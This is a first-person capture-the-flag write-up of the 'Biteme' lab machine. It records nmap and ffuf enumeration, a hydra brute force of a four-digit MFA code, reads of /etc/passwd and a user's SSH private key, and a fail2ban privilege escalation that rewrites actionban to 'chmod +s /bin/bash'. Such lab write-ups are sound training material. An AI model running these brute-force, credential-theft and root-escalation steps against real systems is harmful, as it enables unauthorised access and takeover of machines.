<img width="338" height="133" alt="image" src="https://github.com/user-attachments/assets/3a0badb4-d030-4d3d-8669-f48ba66a8ef2" />

Biteme challenge

Enumeration
┌──(kali㉿kali)-[~]
└─$ nmap -p- -A -T4 10.114.167.12 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-31 12:51 -0400
Nmap scan report for 10.114.167.12
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1b:79:c8:d0:cb:fe:fa:d2:78:94:7f:3e:36:8a:60:c2 (RSA)
|   256 7b:b9:96:4c:00:4a:d7:5e:c5:e4:51:84:e2:3e:d6:0e (ECDSA)
|_  256 ba:8c:e2:58:ed:64:00:49:11:ce:ad:82:d1:63:93:c6 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%), Adtran embedded (92%)
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/h:adtran:424rg
Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 - 5.15 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Adtran 424RG FTTH gateway (92%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   30.42 ms 192.168.128.1
2   ...
3   32.21 ms 10.114.167.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.31 seconds


-----
<img width="927" height="807" alt="image" src="https://github.com/user-attachments/assets/31356cce-b07f-4d67-a382-0a507c57dfa1" />

After visiting the website, we are greeted with the default Apache server page.




┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.114.167.12/FUZZ -fw 3499

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.114.167.12/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3499
________________________________________________

console                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 34ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 35ms]
:: Progress: [220560/220560] :: Job [1/1] :: 1142 req/sec :: Duration: [0:03:18] :: Errors: 0 ::

------
After fuzzing the website we find a console directory. Visiting the page, we are met with a login screen using captcha, so we can already forget about bruteforcing it. 


<img width="671" height="660" alt="image" src="https://github.com/user-attachments/assets/a19f9f83-9356-4130-81a2-f3a8f150fb78" />



-----
After inspecting the page source, I found an interesting message in the script that says: fred I turned on php file syntax highlighting for you to review jason
<img width="629" height="455" alt="image" src="https://github.com/user-attachments/assets/09854b7c-9786-4339-8727-171c9dfaee5f" />


I have also found a directory for the captcha functionalities. This version of it doesn't seem to be vulnerable.
<img width="818" height="464" alt="image" src="https://github.com/user-attachments/assets/bf2aa7c7-5e30-4ed8-b78c-d95ef865373e" />


----
After looking up php file syntax highlighting, I found out .phps extensions are used for this to to automatically highlight them. So I tried fuzzing for these in the console directory.
<img width="1311" height="807" alt="image" src="https://github.com/user-attachments/assets/8a8e7a68-9958-403f-afd1-f110293ae6ef" />


Everything seems to be returning 403.


----
Having 2 usernames (fred and jason), I tried using hydra to bruteforce ssh, but it doesn't support password logins.


-----
After being stuck for a while, I looked up other writeups and others seem to be able to access .phps file, while I'm not. This is the weirdest thing, I've ever seen in a CTF. They don't do anything differently, just put .phps after the console/index file and it works. I've also tried different browsers, restarting the vm, but nothing.
The version of the Apache is different. Mine has 2.4.41, while the other walkthroughs have 2.4.29. 

<img width="802" height="295" alt="image" src="https://github.com/user-attachments/assets/47abc272-eea6-4ec3-8d6b-16e4c8269db9" />


-----
As this is the intended path to exploit the machine, I took the info I couldn't access from other writeups.

Going through the .phps files, we could find the username and password to login to the site.
Username: jason_test_account
Password: braggy

-----

After logging in we are met with a Multi-Factor Authentication. Examining the page source, we find another message to fred saying: fred we need to put some brute force protection on here remind me in the morning jason

<img width="1006" height="610" alt="image" src="https://github.com/user-attachments/assets/edfebc90-5681-4333-aa81-ab2eb87c3175" />
<img width="1888" height="362" alt="image" src="https://github.com/user-attachments/assets/3a78ce63-6f06-4c46-80d8-40123afb8acd" />


-----
Wrote a simple python script to have all the possible numbers and used hydra to bruteforce the MFA.

┌──(kali㉿kali)-[~]
└─$ cat temp.py  
#!/usr/bin/env python3

with open('brute.txt', 'w') as file:
        for i in range(0, 9999):
                padding = 4 - len(str(i))
                for j in range(0, padding):
                        file.write("0")
                file.write(str(i)+"\n")


┌──(kali㉿kali)-[~]
└─$ hydra -l jason_test_account -P brute.txt 10.112.160.15 http-post-form "/console/mfa.php:code=^PASS^:H=Cookie\:user=jason_test_account;pwd=braggy:F=Incorrect code"
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-01 05:38:39
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9999 login tries (l:1/p:9999), ~625 tries per task
[DATA] attacking http-post-form://10.112.160.15:80/console/mfa.php:code=^PASS^:H=Cookie\:user=jason_test_account;pwd=braggy:F=Incorrect code
[80][http-post-form] host: 10.112.160.15   login: jason_test_account   password: 1838
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-01 05:39:21


-------

<img width="1314" height="518" alt="image" src="https://github.com/user-attachments/assets/893b7238-26c3-452f-8942-2ce06738278e" />


After using the file viewer to get /etc/passwd, we find 2 users: fred and jason.
Tying /home/jason/.ssh/id_rsa, we recieve the ssh key to jason.

<img width="864" height="787" alt="image" src="https://github.com/user-attachments/assets/09dd806f-5851-4a49-a06d-695eeba8b7c3" />


------
Using ssh2john and john, we crack the pass for the key.

<img width="817" height="504" alt="image" src="https://github.com/user-attachments/assets/8c67166e-19dc-4de8-a0ae-097422a7e037" />


-----
In the jason's home directory, we find the user flag.
<img width="561" height="230" alt="image" src="https://github.com/user-attachments/assets/5c92cf93-6e73-4bb4-b27e-13176440b999" />


After running sudo -l, it shows that jason has full sudo access with the password, that we do not know.
<img width="1070" height="168" alt="image" src="https://github.com/user-attachments/assets/b704087b-791e-4cf5-9066-72496f96cefa" />


-----
I changed users to fred with sudo -u fred newgrp. Checking sudo capabilities of fred.

<img width="754" height="137" alt="image" src="https://github.com/user-attachments/assets/849769c0-1a70-42d8-a718-61b30a24a7a0" />


We see that the user is able to restart the fail2ban service. Searching about fail2ban, I found this exploit: https://infosecwriteups.com/fail2ban-privilege-escalation-5de164aff6f3
Which says, if we can change the files in the action.d folder, we can gain a root shell. 

bash-5.0$ ls -la iptables-multiport.conf 
-rw-r--r-- 1 fred root 1448 Aug  1 10:01 iptables-multiport.conf
bash-5.0$ cat iptables-multiport.conf 
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed on demand at the first ban (or at the start of Fail2Ban if actionstart_on_demand is set to false).
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed at the stop of jail (or at the end of Fail2Ban)
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = chmod +s /bin/bash

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = chmod +s /bin/bash

[Init]

bash-5.0$


We do have write access to the file. After changing the actionban, we just need to trigger a ban using hydra bruteforcing on the ssh and run bash -p. 
We have gained root privileges and got the root flag.

<img width="695" height="95" alt="image" src="https://github.com/user-attachments/assets/f07237d2-67f1-4b25-9875-1ffeb93dc37d" />


-----

I have also found the issue for not being able to access .phps files. There are 2 versions of php: 7.2 and 7.4. On both of these they are all set to not return them.
<img width="731" height="415" alt="image" src="https://github.com/user-attachments/assets/0871a495-d5de-4341-a054-5f6b0b8624f9" />
